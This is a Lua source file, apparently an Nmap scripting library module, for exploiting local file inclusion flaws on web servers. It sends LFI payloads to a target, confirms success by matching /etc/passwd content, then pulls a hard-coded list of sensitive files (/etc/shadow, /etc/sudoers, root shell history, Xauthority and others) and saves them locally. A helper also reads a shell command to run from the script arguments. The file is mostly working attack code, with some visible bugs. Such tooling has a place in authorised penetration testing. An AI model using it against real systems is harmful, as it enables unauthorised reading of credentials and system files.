---
-- An exploit library for nmap.
--
-- This module provides NSE scripts with an easy way to write exploits for
-- target services, covering what pwntools does for Python, but tailoring
-- the functionality towards what Nmap is typically used for
--
-- LFI
-- If the option --load-all is provided, the script tries to download
-- interesting files from the target to the directory provided.
--
-- If the option --load-all-uri-only is provided, it simply loads the
-- successful LFI'd uris to the file given in the option
--
-- Example usage:
-- <code>
-- TODO
-- </code>
--
-- @copyright Same as Nmap--See https://nmap.org/book/man-legal.html

local stdnse = require "stdnse"
local http = require "http"
local string = require "string"
local io = require "io"

local FILE_SIGNATURES = {
  ['passwd'] = '(.*:.*:.*:.*:.*:.*:.*\n)',
}

-- TODO Load them later from nselib/data/linux_files.txt
-- Source: https://github.com/lightos/Panoptic/blob/master/cases.xml
local INTERESTING_FILES_LINUX = {
"/etc/hostname",
"/etc/networks",
"/etc/timezone",
"/etc/modules",
"/etc/passwd",
"/etc/passwd~",
"/etc/passwd-",
"/etc/shadow",
"/etc/shadow~",
"/etc/shadow-",
"/etc/fstab",
"/etc/motd",
"/etc/hosts",
"/etc/group",
"/etc/group-",
"/etc/alias",
"/etc/crontab",
"/etc/crypttab",
"/etc/exports",
"/etc/mtab",
"/etc/hosts.allow",
"/etc/hosts.deny",
"/etc/os-release",
"/etc/password.master",
"/etc/profile",
"/etc/default/grub",
"/etc/resolvconf/update-libc.d/sendmail",
"/etc/inittab",
"/etc/issue",
"/etc/issue.net",
"/etc/login.defs",
"/etc/sudoers",
"/etc/sysconfig/network-scripts/ifcfg-eth0",
"/etc/redhat-release",
"/etc/debian_version",
"/etc/fedora-release",
"/etc/mandrake-release",
"/etc/slackware-release",
"/etc/SUSE-release",
"/etc/security/group",
"/etc/security/passwd",
"/etc/security/user",
"/etc/security/environ",
"/etc/security/limits",
"/etc/security/opasswd",
"/boot/grub/grub.cfg",
"/boot/grub/menu.lst",
"/root/.ksh_history",
"/root/.Xauthority",
"/usr/lib/security/mkuser.default",
}

_ENV = stdnse.module("exploit", stdnse.seeall)

--- Writes string to file
--  Taken from: hostmap.nse
--  @param filename Filename to write
--  @param contents Content of file
--  @param original filename, if given
--  @param append   boolean signalling to append to a file rather than overwrite
--  @return true if file was written successfully, false otherwise
function write_file(filename, contents, original_file, append)
  local f, err
  if append then
    f, err = io.open(filename, "a")
  else
    f, err = io.open(filename, "w")
  end
  if not f then
    if original_file then
      stdnse.debug2("Error saving %s to %s: %s\n", original_file, filename, err)
    else
      stdnse.debug2("Error saving \"%s\" to %s: %s\n", contents, filename, err)
    end
    return f, err
  end
  f:write(contents)
  f:close()
  if original_file then
    stdnse.debug2("%s saved to %s\n", original_file, filename)
  else
    stdnse.debug2("\"%s\" saved to %s\n", contents, filename)
  end
  return true
end

--- Gets the last portion of the filepath
--  e.g. /etc/passwd returns passwd
--  @param filepath       the filepath
--  @return A string containing the last portion from the filepath
function filepath_last_part(filepath)
  if string.match(filepath, '/') then
    return string.match(filepath, '.*/(.+)')
  else
    return filepath
  end
end

--- Gets the most specifc provided script-args
--  Chooses between the script args "exploit.cmd" and "SCRIPT_NAME.cmd"
--  @param   script_name   the caller script name
--  @return  a string with the most specific cmd to run
function get_shell_cmd(script_name)
  local cmd = stdnse.get_script_args(script_name .. '.cmd') or
    stdnse.get_script_args('exploit.cmd')
  return cmd
end

--- Loads common files if the LFI was successful
--  @param host           the target host
--  @param port           the target port
--  @param payload        the payload that triggers the LFI
--  @param directory      the directory to save the accessed files to
--  @param replace_slash  the character to replace slash with
--  @param postfix        the character(s) to append to the end of the uri
--  @param load_uri_file  the file to save the uris that have been successfully lfi'd
--  @return A table containing strings of all successful LFIs that have been enumerated
local function load_all_lfi (host, port, payload, directory, replace_slash, postfix, load_uri_file)
  -- TODO leverage on OS detection and limit files loaded
  local successful_lfi_uris = {}
  -- ensures that directory is interpreted as a directory when writing
  if directory then
    directory = directory .. '/'
  end

  -- enumerate through interesting files
  for _, file in ipairs(INTERESTING_FILES_LINUX) do
  local r_file = file -- representation of file in uri
    if replace_slash then
      r_file = string.gsub(r_file, '/', replace_slash)
    end

    local uri = payload .. r_file
    if postfix then
      uri = uri .. postfix
    end

    stdnse.debug1("Load All - LFI'ing from uri %s", uri)
    local req = http.get(host, port, uri)
    if req.status and req.status == 200 and req.body and req.body ~= "" then
      -- verify that the files are indeed correct before adding them
      local verifiable, verified = verify_file(file, req.body)
      if (verifiable and verified) or not verifiable then
        -- sets prefix to https if ssl is enabled, http otherwise
        local prefix = 'http' .. ((req.ssl and 's') or '') .. '://'
        local saved_uri = string.format('%s%s:%s%s\n', prefix, host.ip, port.number, uri)
        table.insert(successful_lfi_uris, saved_uri)

        if directory then
          -- saves only the last portion of the filepath to avoid issues with '/'
          local truncated_file = string.format("[%s]%s", host.ip, filepath_last_part(file))
          local save_file = directory .. truncated_file
          write_file(save_file, req.body, file)
        end
      end
    end
  end

  -- saves successful lfi-uris to a file if option is provided
  if load_uri_file then
    -- empties the original file first
    write_file(load_uri_file, '', nil, false)
    for _, lfi_url in ipairs(successful_lfi_uris) do
      write_file(load_uri_file, lfi_url, nil, true)
    end
  end

  return successful_lfi_uris
end

--- Verifies if a file is what it says it is
--  e.g. checks if /etc/passwd contains the expected syntax
--  @param filename       the name of the file to be checked against
--  @param file_contents  the contents of the file
--  @return verfiable     a boolean representing if the file has signatures
--  @return verified      a boolean representing if the file matches the signatures, if any
function verify_file(filename, file_contents)
  local verifiable, verified = false
  if filename and file_contents then
    local filename = filepath_last_part(filename)
    if FILE_SIGNATURES[filename] then
      verifiable = true
      if filename.match(file_contents, FILE_SIGNATURES[filename]) then
        verified = true
      end
    end
  end
  return verifiable, verified
end

--- Executes a LFI on the target URI
--  @param  host          the remote target ip to attack
--  @param  port          the port to run to attack against
--  @param  payload       the lfi payload
--  @param  filename      the local file name to include
--  @param  outfile       the output file to save to
--  @param  replace_slash character to replace slashes with
--  @param  postfix       postfix for the filepath
--  @return status        the status of the request
--  @return lfi_success   the status of the lfi attack
--  @return contents      the contents of the file
--  @return lfi_uris      the other uris that have been successfully loaded
function lfi_check(host, port, payload, filename, outfile, replace_slash, postfix)
  local l_filename = filename or stdnse.get_script_args("exploit.lfi_file") or "/etc/passwd"
  local outfile = outfile or stdnse.get_script_args("exploit.outfile")
  local load_all_dir = stdnse.get_script_args("exploit.load-all")
  local load_all_uri_only_file = stdnse.get_script_args("exploit.load-all-uri-only")
  if replace_slash then
    string.gsub(l_filename, '/', replace_slash)
  end
  local uri = payload .. l_filename

  if postfix then
    uri = uri .. postfix
  end

  stdnse.debug1("Getting %s", uri)
  local req = http.get(host, port, uri)
  stdnse.debug1("Status code " .. req.status)

  -- response came back
  if req.status and req.status == 200 then
    -- quit if body is empty, meaning file not included
    if string.len(req.body) <= 0 then
      stdnse.debug1("Response was empty using %s", uri)
      return req.status, false, req.body
    end

    -- if there are signatures try to verify them
    local verifiable, verified = verify_file(l_filename, req.body)

    if outfile then
      local status, err = write_file(outfile, req.body, l_filename)
    end

    -- we deem it successful if
    -- there are known signatures and signatures check pass
    -- OR if there no known signatures and lfi passed
    local lfi_success = (verifiable and verified) or (not verifiable and req.status)

    local lfi_uris
    -- we only load more files if the lfi is successful
    if lfi_success and (load_all_dir or load_all_uri_only_file) then
      lfi_uris = load_all_lfi(host, port, payload, load_all_dir, replace_slash,
        postfix, load_all_uri_only_file)
    end

    return req.status, lfi_success, req.body, lfi_uris
  else
    return req.status, false, req.body
  end

end

return _ENV
